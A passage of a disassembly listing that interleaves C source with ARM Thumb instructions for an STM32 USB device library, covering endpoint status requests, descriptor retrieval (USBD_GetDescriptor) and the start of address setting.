 800ba78:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800ba7c:	4613      	mov	r3, r2
 800ba7e:	009b      	lsls	r3, r3, #2
 800ba80:	4413      	add	r3, r2
 800ba82:	009b      	lsls	r3, r3, #2
 800ba84:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800ba88:	687a      	ldr	r2, [r7, #4]
 800ba8a:	4413      	add	r3, r2
 800ba8c:	3304      	adds	r3, #4
 800ba8e:	60bb      	str	r3, [r7, #8]

              if ((ep_addr == 0x00U) || (ep_addr == 0x80U))
 800ba90:	7bbb      	ldrb	r3, [r7, #14]
 800ba92:	2b00      	cmp	r3, #0
 800ba94:	d002      	beq.n	800ba9c <USBD_StdEPReq+0x2d8>
 800ba96:	7bbb      	ldrb	r3, [r7, #14]
 800ba98:	2b80      	cmp	r3, #128	; 0x80
 800ba9a:	d103      	bne.n	800baa4 <USBD_StdEPReq+0x2e0>
              {
                pep->status = 0x0000U;
 800ba9c:	68bb      	ldr	r3, [r7, #8]
 800ba9e:	2200      	movs	r2, #0
 800baa0:	601a      	str	r2, [r3, #0]
 800baa2:	e00e      	b.n	800bac2 <USBD_StdEPReq+0x2fe>
              }
              else if (USBD_LL_IsStallEP(pdev, ep_addr) != 0U)
 800baa4:	7bbb      	ldrb	r3, [r7, #14]
 800baa6:	4619      	mov	r1, r3
 800baa8:	6878      	ldr	r0, [r7, #4]
 800baaa:	f001 f979 	bl	800cda0 <USBD_LL_IsStallEP>
 800baae:	4603      	mov	r3, r0
 800bab0:	2b00      	cmp	r3, #0
 800bab2:	d003      	beq.n	800babc <USBD_StdEPReq+0x2f8>
              {
                pep->status = 0x0001U;
 800bab4:	68bb      	ldr	r3, [r7, #8]
 800bab6:	2201      	movs	r2, #1
 800bab8:	601a      	str	r2, [r3, #0]
 800baba:	e002      	b.n	800bac2 <USBD_StdEPReq+0x2fe>
              }
              else
              {
                pep->status = 0x0000U;
 800babc:	68bb      	ldr	r3, [r7, #8]
 800babe:	2200      	movs	r2, #0
 800bac0:	601a      	str	r2, [r3, #0]
              }

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800bac2:	68bb      	ldr	r3, [r7, #8]
 800bac4:	2202      	movs	r2, #2
 800bac6:	4619      	mov	r1, r3
 800bac8:	6878      	ldr	r0, [r7, #4]
 800baca:	f000 fbfb 	bl	800c2c4 <USBD_CtlSendData>
              break;
 800bace:	e004      	b.n	800bada <USBD_StdEPReq+0x316>

            default:
              USBD_CtlError(pdev, req);
 800bad0:	6839      	ldr	r1, [r7, #0]
 800bad2:	6878      	ldr	r0, [r7, #4]
 800bad4:	f000 fb85 	bl	800c1e2 <USBD_CtlError>
              break;
 800bad8:	bf00      	nop
          }
          break;
 800bada:	e004      	b.n	800bae6 <USBD_StdEPReq+0x322>

        default:
          USBD_CtlError(pdev, req);
 800badc:	6839      	ldr	r1, [r7, #0]
 800bade:	6878      	ldr	r0, [r7, #4]
 800bae0:	f000 fb7f 	bl	800c1e2 <USBD_CtlError>
          break;
 800bae4:	bf00      	nop
      }
      break;
 800bae6:	e005      	b.n	800baf4 <USBD_StdEPReq+0x330>

    default:
      USBD_CtlError(pdev, req);
 800bae8:	6839      	ldr	r1, [r7, #0]
 800baea:	6878      	ldr	r0, [r7, #4]
 800baec:	f000 fb79 	bl	800c1e2 <USBD_CtlError>
      break;
 800baf0:	e000      	b.n	800baf4 <USBD_StdEPReq+0x330>
      break;
 800baf2:	bf00      	nop
  }

  return ret;
 800baf4:	7bfb      	ldrb	r3, [r7, #15]
}
 800baf6:	4618      	mov	r0, r3
 800baf8:	3710      	adds	r7, #16
 800bafa:	46bd      	mov	sp, r7
 800bafc:	bd80      	pop	{r7, pc}
	...

0800bb00 <USBD_GetDescriptor>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetDescriptor(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bb00:	b580      	push	{r7, lr}
 800bb02:	b084      	sub	sp, #16
 800bb04:	af00      	add	r7, sp, #0
 800bb06:	6078      	str	r0, [r7, #4]
 800bb08:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800bb0a:	2300      	movs	r3, #0
 800bb0c:	813b      	strh	r3, [r7, #8]
  uint8_t *pbuf = NULL;
 800bb0e:	2300      	movs	r3, #0
 800bb10:	60fb      	str	r3, [r7, #12]
  uint8_t err = 0U;
 800bb12:	2300      	movs	r3, #0
 800bb14:	72fb      	strb	r3, [r7, #11]

  switch (req->wValue >> 8)
 800bb16:	683b      	ldr	r3, [r7, #0]
 800bb18:	885b      	ldrh	r3, [r3, #2]
 800bb1a:	0a1b      	lsrs	r3, r3, #8
 800bb1c:	b29b      	uxth	r3, r3
 800bb1e:	3b01      	subs	r3, #1
 800bb20:	2b0e      	cmp	r3, #14
 800bb22:	f200 8152 	bhi.w	800bdca <USBD_GetDescriptor+0x2ca>
 800bb26:	a201      	add	r2, pc, #4	; (adr r2, 800bb2c <USBD_GetDescriptor+0x2c>)
 800bb28:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bb2c:	0800bb9d 	.word	0x0800bb9d
 800bb30:	0800bbb5 	.word	0x0800bbb5
 800bb34:	0800bbf5 	.word	0x0800bbf5
 800bb38:	0800bdcb 	.word	0x0800bdcb
 800bb3c:	0800bdcb 	.word	0x0800bdcb
 800bb40:	0800bd6b 	.word	0x0800bd6b
 800bb44:	0800bd97 	.word	0x0800bd97
 800bb48:	0800bdcb 	.word	0x0800bdcb
 800bb4c:	0800bdcb 	.word	0x0800bdcb
 800bb50:	0800bdcb 	.word	0x0800bdcb
 800bb54:	0800bdcb 	.word	0x0800bdcb
 800bb58:	0800bdcb 	.word	0x0800bdcb
 800bb5c:	0800bdcb 	.word	0x0800bdcb
 800bb60:	0800bdcb 	.word	0x0800bdcb
 800bb64:	0800bb69 	.word	0x0800bb69
  {
#if ((USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U))
    case USB_DESC_TYPE_BOS:
      if (pdev->pDesc->GetBOSDescriptor != NULL)
 800bb68:	687b      	ldr	r3, [r7, #4]
 800bb6a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb6e:	69db      	ldr	r3, [r3, #28]
 800bb70:	2b00      	cmp	r3, #0
 800bb72:	d00b      	beq.n	800bb8c <USBD_GetDescriptor+0x8c>
      {
        pbuf = pdev->pDesc->GetBOSDescriptor(pdev->dev_speed, &len);
 800bb74:	687b      	ldr	r3, [r7, #4]
 800bb76:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb7a:	69db      	ldr	r3, [r3, #28]
 800bb7c:	687a      	ldr	r2, [r7, #4]
 800bb7e:	7c12      	ldrb	r2, [r2, #16]
 800bb80:	f107 0108 	add.w	r1, r7, #8
 800bb84:	4610      	mov	r0, r2
 800bb86:	4798      	blx	r3
 800bb88:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bb8a:	e126      	b.n	800bdda <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bb8c:	6839      	ldr	r1, [r7, #0]
 800bb8e:	6878      	ldr	r0, [r7, #4]
 800bb90:	f000 fb27 	bl	800c1e2 <USBD_CtlError>
        err++;
 800bb94:	7afb      	ldrb	r3, [r7, #11]
 800bb96:	3301      	adds	r3, #1
 800bb98:	72fb      	strb	r3, [r7, #11]
      break;
 800bb9a:	e11e      	b.n	800bdda <USBD_GetDescriptor+0x2da>
#endif /* (USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U) */
    case USB_DESC_TYPE_DEVICE:
      pbuf = pdev->pDesc->GetDeviceDescriptor(pdev->dev_speed, &len);
 800bb9c:	687b      	ldr	r3, [r7, #4]
 800bb9e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bba2:	681b      	ldr	r3, [r3, #0]
 800bba4:	687a      	ldr	r2, [r7, #4]
 800bba6:	7c12      	ldrb	r2, [r2, #16]
 800bba8:	f107 0108 	add.w	r1, r7, #8
 800bbac:	4610      	mov	r0, r2
 800bbae:	4798      	blx	r3
 800bbb0:	60f8      	str	r0, [r7, #12]
      break;
 800bbb2:	e112      	b.n	800bdda <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bbb4:	687b      	ldr	r3, [r7, #4]
 800bbb6:	7c1b      	ldrb	r3, [r3, #16]
 800bbb8:	2b00      	cmp	r3, #0
 800bbba:	d10d      	bne.n	800bbd8 <USBD_GetDescriptor+0xd8>
          pbuf   = (uint8_t *)USBD_CMPSIT.GetHSConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetHSConfigDescriptor(&len);
 800bbbc:	687b      	ldr	r3, [r7, #4]
 800bbbe:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bbc2:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800bbc4:	f107 0208 	add.w	r2, r7, #8
 800bbc8:	4610      	mov	r0, r2
 800bbca:	4798      	blx	r3
 800bbcc:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bbce:	68fb      	ldr	r3, [r7, #12]
 800bbd0:	3301      	adds	r3, #1
 800bbd2:	2202      	movs	r2, #2
 800bbd4:	701a      	strb	r2, [r3, #0]
        {
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
      }
      break;
 800bbd6:	e100      	b.n	800bdda <USBD_GetDescriptor+0x2da>
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
 800bbd8:	687b      	ldr	r3, [r7, #4]
 800bbda:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bbde:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800bbe0:	f107 0208 	add.w	r2, r7, #8
 800bbe4:	4610      	mov	r0, r2
 800bbe6:	4798      	blx	r3
 800bbe8:	60f8      	str	r0, [r7, #12]
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bbea:	68fb      	ldr	r3, [r7, #12]
 800bbec:	3301      	adds	r3, #1
 800bbee:	2202      	movs	r2, #2
 800bbf0:	701a      	strb	r2, [r3, #0]
      break;
 800bbf2:	e0f2      	b.n	800bdda <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_STRING:
      switch ((uint8_t)(req->wValue))
 800bbf4:	683b      	ldr	r3, [r7, #0]
 800bbf6:	885b      	ldrh	r3, [r3, #2]
 800bbf8:	b2db      	uxtb	r3, r3
 800bbfa:	2b05      	cmp	r3, #5
 800bbfc:	f200 80ac 	bhi.w	800bd58 <USBD_GetDescriptor+0x258>
 800bc00:	a201      	add	r2, pc, #4	; (adr r2, 800bc08 <USBD_GetDescriptor+0x108>)
 800bc02:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bc06:	bf00      	nop
 800bc08:	0800bc21 	.word	0x0800bc21
 800bc0c:	0800bc55 	.word	0x0800bc55
 800bc10:	0800bc89 	.word	0x0800bc89
 800bc14:	0800bcbd 	.word	0x0800bcbd
 800bc18:	0800bcf1 	.word	0x0800bcf1
 800bc1c:	0800bd25 	.word	0x0800bd25
      {
        case USBD_IDX_LANGID_STR:
          if (pdev->pDesc->GetLangIDStrDescriptor != NULL)
 800bc20:	687b      	ldr	r3, [r7, #4]
 800bc22:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc26:	685b      	ldr	r3, [r3, #4]
 800bc28:	2b00      	cmp	r3, #0
 800bc2a:	d00b      	beq.n	800bc44 <USBD_GetDescriptor+0x144>
          {
            pbuf = pdev->pDesc->GetLangIDStrDescriptor(pdev->dev_speed, &len);
 800bc2c:	687b      	ldr	r3, [r7, #4]
 800bc2e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc32:	685b      	ldr	r3, [r3, #4]
 800bc34:	687a      	ldr	r2, [r7, #4]
 800bc36:	7c12      	ldrb	r2, [r2, #16]
 800bc38:	f107 0108 	add.w	r1, r7, #8
 800bc3c:	4610      	mov	r0, r2
 800bc3e:	4798      	blx	r3
 800bc40:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc42:	e091      	b.n	800bd68 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc44:	6839      	ldr	r1, [r7, #0]
 800bc46:	6878      	ldr	r0, [r7, #4]
 800bc48:	f000 facb 	bl	800c1e2 <USBD_CtlError>
            err++;
 800bc4c:	7afb      	ldrb	r3, [r7, #11]
 800bc4e:	3301      	adds	r3, #1
 800bc50:	72fb      	strb	r3, [r7, #11]
          break;
 800bc52:	e089      	b.n	800bd68 <USBD_GetDescriptor+0x268>

        case USBD_IDX_MFC_STR:
          if (pdev->pDesc->GetManufacturerStrDescriptor != NULL)
 800bc54:	687b      	ldr	r3, [r7, #4]
 800bc56:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc5a:	689b      	ldr	r3, [r3, #8]
 800bc5c:	2b00      	cmp	r3, #0
 800bc5e:	d00b      	beq.n	800bc78 <USBD_GetDescriptor+0x178>
          {
            pbuf = pdev->pDesc->GetManufacturerStrDescriptor(pdev->dev_speed, &len);
 800bc60:	687b      	ldr	r3, [r7, #4]
 800bc62:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc66:	689b      	ldr	r3, [r3, #8]
 800bc68:	687a      	ldr	r2, [r7, #4]
 800bc6a:	7c12      	ldrb	r2, [r2, #16]
 800bc6c:	f107 0108 	add.w	r1, r7, #8
 800bc70:	4610      	mov	r0, r2
 800bc72:	4798      	blx	r3
 800bc74:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc76:	e077      	b.n	800bd68 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc78:	6839      	ldr	r1, [r7, #0]
 800bc7a:	6878      	ldr	r0, [r7, #4]
 800bc7c:	f000 fab1 	bl	800c1e2 <USBD_CtlError>
            err++;
 800bc80:	7afb      	ldrb	r3, [r7, #11]
 800bc82:	3301      	adds	r3, #1
 800bc84:	72fb      	strb	r3, [r7, #11]
          break;
 800bc86:	e06f      	b.n	800bd68 <USBD_GetDescriptor+0x268>

        case USBD_IDX_PRODUCT_STR:
          if (pdev->pDesc->GetProductStrDescriptor != NULL)
 800bc88:	687b      	ldr	r3, [r7, #4]
 800bc8a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc8e:	68db      	ldr	r3, [r3, #12]
 800bc90:	2b00      	cmp	r3, #0
 800bc92:	d00b      	beq.n	800bcac <USBD_GetDescriptor+0x1ac>
          {
            pbuf = pdev->pDesc->GetProductStrDescriptor(pdev->dev_speed, &len);
 800bc94:	687b      	ldr	r3, [r7, #4]
 800bc96:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc9a:	68db      	ldr	r3, [r3, #12]
 800bc9c:	687a      	ldr	r2, [r7, #4]
 800bc9e:	7c12      	ldrb	r2, [r2, #16]
 800bca0:	f107 0108 	add.w	r1, r7, #8
 800bca4:	4610      	mov	r0, r2
 800bca6:	4798      	blx	r3
 800bca8:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bcaa:	e05d      	b.n	800bd68 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bcac:	6839      	ldr	r1, [r7, #0]
 800bcae:	6878      	ldr	r0, [r7, #4]
 800bcb0:	f000 fa97 	bl	800c1e2 <USBD_CtlError>
            err++;
 800bcb4:	7afb      	ldrb	r3, [r7, #11]
 800bcb6:	3301      	adds	r3, #1
 800bcb8:	72fb      	strb	r3, [r7, #11]
          break;
 800bcba:	e055      	b.n	800bd68 <USBD_GetDescriptor+0x268>

        case USBD_IDX_SERIAL_STR:
          if (pdev->pDesc->GetSerialStrDescriptor != NULL)
 800bcbc:	687b      	ldr	r3, [r7, #4]
 800bcbe:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcc2:	691b      	ldr	r3, [r3, #16]
 800bcc4:	2b00      	cmp	r3, #0
 800bcc6:	d00b      	beq.n	800bce0 <USBD_GetDescriptor+0x1e0>
          {
            pbuf = pdev->pDesc->GetSerialStrDescriptor(pdev->dev_speed, &len);
 800bcc8:	687b      	ldr	r3, [r7, #4]
 800bcca:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcce:	691b      	ldr	r3, [r3, #16]
 800bcd0:	687a      	ldr	r2, [r7, #4]
 800bcd2:	7c12      	ldrb	r2, [r2, #16]
 800bcd4:	f107 0108 	add.w	r1, r7, #8
 800bcd8:	4610      	mov	r0, r2
 800bcda:	4798      	blx	r3
 800bcdc:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bcde:	e043      	b.n	800bd68 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bce0:	6839      	ldr	r1, [r7, #0]
 800bce2:	6878      	ldr	r0, [r7, #4]
 800bce4:	f000 fa7d 	bl	800c1e2 <USBD_CtlError>
            err++;
 800bce8:	7afb      	ldrb	r3, [r7, #11]
 800bcea:	3301      	adds	r3, #1
 800bcec:	72fb      	strb	r3, [r7, #11]
          break;
 800bcee:	e03b      	b.n	800bd68 <USBD_GetDescriptor+0x268>

        case USBD_IDX_CONFIG_STR:
          if (pdev->pDesc->GetConfigurationStrDescriptor != NULL)
 800bcf0:	687b      	ldr	r3, [r7, #4]
 800bcf2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcf6:	695b      	ldr	r3, [r3, #20]
 800bcf8:	2b00      	cmp	r3, #0
 800bcfa:	d00b      	beq.n	800bd14 <USBD_GetDescriptor+0x214>
          {
            pbuf = pdev->pDesc->GetConfigurationStrDescriptor(pdev->dev_speed, &len);
 800bcfc:	687b      	ldr	r3, [r7, #4]
 800bcfe:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd02:	695b      	ldr	r3, [r3, #20]
 800bd04:	687a      	ldr	r2, [r7, #4]
 800bd06:	7c12      	ldrb	r2, [r2, #16]
 800bd08:	f107 0108 	add.w	r1, r7, #8
 800bd0c:	4610      	mov	r0, r2
 800bd0e:	4798      	blx	r3
 800bd10:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bd12:	e029      	b.n	800bd68 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bd14:	6839      	ldr	r1, [r7, #0]
 800bd16:	6878      	ldr	r0, [r7, #4]
 800bd18:	f000 fa63 	bl	800c1e2 <USBD_CtlError>
            err++;
 800bd1c:	7afb      	ldrb	r3, [r7, #11]
 800bd1e:	3301      	adds	r3, #1
 800bd20:	72fb      	strb	r3, [r7, #11]
          break;
 800bd22:	e021      	b.n	800bd68 <USBD_GetDescriptor+0x268>

        case USBD_IDX_INTERFACE_STR:
          if (pdev->pDesc->GetInterfaceStrDescriptor != NULL)
 800bd24:	687b      	ldr	r3, [r7, #4]
 800bd26:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd2a:	699b      	ldr	r3, [r3, #24]
 800bd2c:	2b00      	cmp	r3, #0
 800bd2e:	d00b      	beq.n	800bd48 <USBD_GetDescriptor+0x248>
          {
            pbuf = pdev->pDesc->GetInterfaceStrDescriptor(pdev->dev_speed, &len);
 800bd30:	687b      	ldr	r3, [r7, #4]
 800bd32:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd36:	699b      	ldr	r3, [r3, #24]
 800bd38:	687a      	ldr	r2, [r7, #4]
 800bd3a:	7c12      	ldrb	r2, [r2, #16]
 800bd3c:	f107 0108 	add.w	r1, r7, #8
 800bd40:	4610      	mov	r0, r2
 800bd42:	4798      	blx	r3
 800bd44:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bd46:	e00f      	b.n	800bd68 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bd48:	6839      	ldr	r1, [r7, #0]
 800bd4a:	6878      	ldr	r0, [r7, #4]
 800bd4c:	f000 fa49 	bl	800c1e2 <USBD_CtlError>
            err++;
 800bd50:	7afb      	ldrb	r3, [r7, #11]
 800bd52:	3301      	adds	r3, #1
 800bd54:	72fb      	strb	r3, [r7, #11]
          break;
 800bd56:	e007      	b.n	800bd68 <USBD_GetDescriptor+0x268>
            err++;
          }
#endif /* USBD_SUPPORT_USER_STRING_DESC  */

#if ((USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U))
          USBD_CtlError(pdev, req);
 800bd58:	6839      	ldr	r1, [r7, #0]
 800bd5a:	6878      	ldr	r0, [r7, #4]
 800bd5c:	f000 fa41 	bl	800c1e2 <USBD_CtlError>
          err++;
 800bd60:	7afb      	ldrb	r3, [r7, #11]
 800bd62:	3301      	adds	r3, #1
 800bd64:	72fb      	strb	r3, [r7, #11]
#endif /* (USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U) */
          break;
 800bd66:	bf00      	nop
      }
      break;
 800bd68:	e037      	b.n	800bdda <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_DEVICE_QUALIFIER:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd6a:	687b      	ldr	r3, [r7, #4]
 800bd6c:	7c1b      	ldrb	r3, [r3, #16]
 800bd6e:	2b00      	cmp	r3, #0
 800bd70:	d109      	bne.n	800bd86 <USBD_GetDescriptor+0x286>
          pbuf = (uint8_t *)USBD_CMPSIT.GetDeviceQualifierDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetDeviceQualifierDescriptor(&len);
 800bd72:	687b      	ldr	r3, [r7, #4]
 800bd74:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd78:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800bd7a:	f107 0208 	add.w	r2, r7, #8
 800bd7e:	4610      	mov	r0, r2
 800bd80:	4798      	blx	r3
 800bd82:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bd84:	e029      	b.n	800bdda <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bd86:	6839      	ldr	r1, [r7, #0]
 800bd88:	6878      	ldr	r0, [r7, #4]
 800bd8a:	f000 fa2a 	bl	800c1e2 <USBD_CtlError>
        err++;
 800bd8e:	7afb      	ldrb	r3, [r7, #11]
 800bd90:	3301      	adds	r3, #1
 800bd92:	72fb      	strb	r3, [r7, #11]
      break;
 800bd94:	e021      	b.n	800bdda <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd96:	687b      	ldr	r3, [r7, #4]
 800bd98:	7c1b      	ldrb	r3, [r3, #16]
 800bd9a:	2b00      	cmp	r3, #0
 800bd9c:	d10d      	bne.n	800bdba <USBD_GetDescriptor+0x2ba>
          pbuf = (uint8_t *)USBD_CMPSIT.GetOtherSpeedConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetOtherSpeedConfigDescriptor(&len);
 800bd9e:	687b      	ldr	r3, [r7, #4]
 800bda0:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bda4:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800bda6:	f107 0208 	add.w	r2, r7, #8
 800bdaa:	4610      	mov	r0, r2
 800bdac:	4798      	blx	r3
 800bdae:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION;
 800bdb0:	68fb      	ldr	r3, [r7, #12]
 800bdb2:	3301      	adds	r3, #1
 800bdb4:	2207      	movs	r2, #7
 800bdb6:	701a      	strb	r2, [r3, #0]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bdb8:	e00f      	b.n	800bdda <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bdba:	6839      	ldr	r1, [r7, #0]
 800bdbc:	6878      	ldr	r0, [r7, #4]
 800bdbe:	f000 fa10 	bl	800c1e2 <USBD_CtlError>
        err++;
 800bdc2:	7afb      	ldrb	r3, [r7, #11]
 800bdc4:	3301      	adds	r3, #1
 800bdc6:	72fb      	strb	r3, [r7, #11]
      break;
 800bdc8:	e007      	b.n	800bdda <USBD_GetDescriptor+0x2da>

    default:
      USBD_CtlError(pdev, req);
 800bdca:	6839      	ldr	r1, [r7, #0]
 800bdcc:	6878      	ldr	r0, [r7, #4]
 800bdce:	f000 fa08 	bl	800c1e2 <USBD_CtlError>
      err++;
 800bdd2:	7afb      	ldrb	r3, [r7, #11]
 800bdd4:	3301      	adds	r3, #1
 800bdd6:	72fb      	strb	r3, [r7, #11]
      break;
 800bdd8:	bf00      	nop
  }

  if (err != 0U)
 800bdda:	7afb      	ldrb	r3, [r7, #11]
 800bddc:	2b00      	cmp	r3, #0
 800bdde:	d11e      	bne.n	800be1e <USBD_GetDescriptor+0x31e>
  {
    return;
  }

  if (req->wLength != 0U)
 800bde0:	683b      	ldr	r3, [r7, #0]
 800bde2:	88db      	ldrh	r3, [r3, #6]
 800bde4:	2b00      	cmp	r3, #0
 800bde6:	d016      	beq.n	800be16 <USBD_GetDescriptor+0x316>
  {
    if (len != 0U)
 800bde8:	893b      	ldrh	r3, [r7, #8]
 800bdea:	2b00      	cmp	r3, #0
 800bdec:	d00e      	beq.n	800be0c <USBD_GetDescriptor+0x30c>
    {
      len = MIN(len, req->wLength);
 800bdee:	683b      	ldr	r3, [r7, #0]
 800bdf0:	88da      	ldrh	r2, [r3, #6]
 800bdf2:	893b      	ldrh	r3, [r7, #8]
 800bdf4:	4293      	cmp	r3, r2
 800bdf6:	bf28      	it	cs
 800bdf8:	4613      	movcs	r3, r2
 800bdfa:	b29b      	uxth	r3, r3
 800bdfc:	813b      	strh	r3, [r7, #8]
      (void)USBD_CtlSendData(pdev, pbuf, len);
 800bdfe:	893b      	ldrh	r3, [r7, #8]
 800be00:	461a      	mov	r2, r3
 800be02:	68f9      	ldr	r1, [r7, #12]
 800be04:	6878      	ldr	r0, [r7, #4]
 800be06:	f000 fa5d 	bl	800c2c4 <USBD_CtlSendData>
 800be0a:	e009      	b.n	800be20 <USBD_GetDescriptor+0x320>
    }
    else
    {
      USBD_CtlError(pdev, req);
 800be0c:	6839      	ldr	r1, [r7, #0]
 800be0e:	6878      	ldr	r0, [r7, #4]
 800be10:	f000 f9e7 	bl	800c1e2 <USBD_CtlError>
 800be14:	e004      	b.n	800be20 <USBD_GetDescriptor+0x320>
    }
  }
  else
  {
    (void)USBD_CtlSendStatus(pdev);
 800be16:	6878      	ldr	r0, [r7, #4]
 800be18:	f000 faae 	bl	800c378 <USBD_CtlSendStatus>
 800be1c:	e000      	b.n	800be20 <USBD_GetDescriptor+0x320>
    return;
 800be1e:	bf00      	nop
  }
}
 800be20:	3710      	adds	r7, #16
 800be22:	46bd      	mov	sp, r7
 800be24:	bd80      	pop	{r7, pc}
 800be26:	bf00      	nop

0800be28 <USBD_SetAddress>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetAddress(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800be28:	b580      	push	{r7, lr}
 800be2a:	b084      	sub	sp, #16
 800be2c:	af00      	add	r7, sp, #0
 800be2e:	6078      	str	r0, [r7, #4]
 800be30:	6039      	str	r1, [r7, #0]
  uint8_t  dev_addr;

  if ((req->wIndex == 0U) && (req->wLength == 0U) && (req->wValue < 128U))
 800be32:	683b      	ldr	r3, [r7, #0]
 800be34:	889b      	ldrh	r3, [r3, #4]
 800be36:	2b00      	cmp	r3, #0
 800be38:	d131      	bne.n	800be9e <USBD_SetAddress+0x76>
 800be3a:	683b      	ldr	r3, [r7, #0]
 800be3c:	88db      	ldrh	r3, [r3, #6]
 800be3e:	2b00      	cmp	r3, #0
 800be40:	d12d      	bne.n	800be9e <USBD_SetAddress+0x76>
 800be42:	683b      	ldr	r3, [r7, #0]
 800be44:	885b      	ldrh	r3, [r3, #2]
 800be46:	2b7f      	cmp	r3, #127	; 0x7f
 800be48:	d829      	bhi.n	800be9e <USBD_SetAddress+0x76>
  {
    dev_addr = (uint8_t)(req->wValue) & 0x7FU;
 800be4a:	683b      	ldr	r3, [r7, #0]
 800be4c:	885b      	ldrh	r3, [r3, #2]
 800be4e:	b2db      	uxtb	r3, r3
 800be50:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800be54:	73fb      	strb	r3, [r7, #15]

    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be56:	687b      	ldr	r3, [r7, #4]
